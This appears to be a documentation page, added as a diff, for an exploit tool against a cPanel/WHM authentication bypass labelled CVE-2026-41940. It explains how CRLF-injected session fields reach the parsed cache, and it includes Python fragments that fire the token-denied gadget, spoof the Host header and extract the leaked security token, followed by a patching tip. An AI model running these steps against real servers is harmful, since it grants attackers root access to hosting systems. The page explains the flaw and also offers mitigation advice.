@@ -1,0 +1,111 @@
+---
+title: "cPanel/WHM session file and cache architecture"
+description: "How cpsrvd's two-layer session system — raw file and parsed cache — is abused in CVE-2026-41940 to forge a persistent root-authenticated state."
+---
+
+cpsrvd uses a two-layer session architecture: a raw on-disk session file and a separate parsed in-memory session cache. Understanding both layers — and why they are distinct — is essential to understanding why the exploit requires both stage 2 (CRLF injection) and stage 3 (cache propagation). Writing to the raw file does not automatically update the cache; the cache must be populated through a separate mechanism.
+
+## Layer 1: Raw session files
+
+Session data is persisted to disk as newline-delimited `key=value` files. Each file is identified by the `whostmgrsession` cookie value — the cookie functions as both a session identifier and a lookup key for the corresponding file on disk.
+
+Stage 2's CRLF injection writes forged authentication fields into this raw file by embedding `\r\n` sequences in the base64-decoded `Authorization` header value. After stage 2 completes, the session file on disk contains:
+
+```text
+root:x
+successful_internal_auth_with_timestamp=9999999999
+user=root
+tfa_verified=1
+hasroot=1
+```
+
+However, cpsrvd's authentication checks during normal request handling do not read from the raw file directly — they consult the parsed session cache. A write to the raw file alone has no effect on the outcome of an authentication decision.
+
+## Layer 2: Parsed session cache
+
+The parsed session cache is populated when cpsrvd validates a session token. Once populated, subsequent requests for that session use the cached data rather than re-parsing the raw file.
+
+The `do_token_denied` handler — triggered in stage 3 — is the gadget that bridges the two layers. When a request arrives with a valid `whostmgrsession` cookie but without a valid security token (or with a token for a WHM-only endpoint like `/scripts2/listaccts`), cpsrvd invokes this handler. As a side-effect of handling the denial, it reads the raw session file and writes the parsed result into the session cache.
+
+Stage 3 fires this gadget intentionally:
+
+```python
+cookie_enc = urllib.parse.quote(session_base)
+r = http(s, "GET", scheme, host, port, canonical, "/scripts2/listaccts",
+         headers={"Cookie": f"whostmgrsession={cookie_enc}"})
+
+body = r.text or ""
+if r.status_code == 401 and ("Token denied" in body or "WHM Login" in body):
+    print(f"    HTTP {r.status_code}, gadget fired")
+```
+
+Once `do_token_denied` runs, the forged fields from the raw file are resident in the parsed cache. All subsequent requests — including the stage 4 verification call — authenticate against that cached, forged session data.
+
+## The canonical hostname requirement
+
+cpsrvd validates the `Host` header on every incoming request against the server's canonical hostname. A mismatch causes a `307` redirect to the canonical URL, with the correct hostname appearing in the `Location` header. This redirect behaviour is also what leaks the `cp_security_token` in stage 2.
+
+The tool auto-discovers the canonical hostname before any exploit stage runs, by triggering the redirect deliberately:
+
+```python
+def discover_canonical_host(scheme, host, port):
+    # cpsrvd 307s us to the right hostname when our Host header is wrong
+    r = requests.get(
+        f"{scheme}://{host}:{port}/openid_connect/cpanelid",
+        verify=False,
+        allow_redirects=False,
+        headers={"Connection": "close"},
+        timeout=10,
+    )
+    loc = r.headers.get("Location", "")
+    m = re.match(r"^https?://([^:/]+)", loc)
+    if m:
+        return m.group(1)
+    return host
+```
+
+Once discovered, the canonical hostname is injected into every subsequent request via the `http()` helper, which sets the `Host` header by default:
+
+```python
+def http(s, method, scheme, host, port, canonical, path, **kw):
+    # always send to the IP, but spoof Host so cpsrvd doesn't redirect us
+    headers = kw.pop("headers", {})
+    headers.setdefault("Host", f"{canonical}:{port}")
+    headers.setdefault("Connection", "close")
+    return s.request(
+        method,
+        f"{scheme}://{host}:{port}{path}",
+        headers=headers,
+        allow_redirects=False,
+        **kw,
+    )
+```
+
+The actual TCP connection is made to the target IP, but the `Host` header always presents the canonical hostname, preventing cpsrvd from redirecting exploit requests mid-chain.
+
+## Security token lifecycle
+
+The `cp_security_token` (`/cpsess<10 digits>`) is a per-session CSRF token issued by cpsrvd for WHM. It prefixes all WHM API paths to prevent cross-site request forgery.
+
+In the normal authentication flow, the token is issued after successful credential verification. In CVE-2026-41940, the token is leaked in the `Location` header of the stage 2 `307` redirect — before any credential check has been passed:
+
+```python
+loc = r.headers.get("Location", "")
+m = re.search(r"/cpsess\d{10}", loc)
+token = m.group(0)
+```
+
+At the point of leak, the token exists but is not yet usable — the session cache has not been populated with the forged data. Only after stage 3 fires `do_token_denied` does the cache contain the forged root session, making the leaked token valid for authenticated WHM API calls in stage 4.
+
+<Tip>
+  Patching this vulnerability most directly involves sanitizing CRLF sequences in the Authorization header processing path — specifically, stripping or rejecting `\r` and `\n` characters from the base64-decoded credential value before it is written to the session file. A secondary mitigation would be invalidating or re-generating the security token after the session cache is first populated from a raw file, to prevent pre-auth token leaks from being usable post-injection.
+</Tip>
+
+<CardGroup cols={2}>
+  <Card title="Exploit chain overview" icon="list-ordered" href="/technical/exploit-chain">
+    All four stages and how they chain together end to end.
+  </Card>
+  <Card title="CRLF injection mechanics" icon="code" href="/technical/crlf-injection">
+    How the Authorization header payload injects forged session fields into the raw file.
+  </Card>
+</CardGroup>
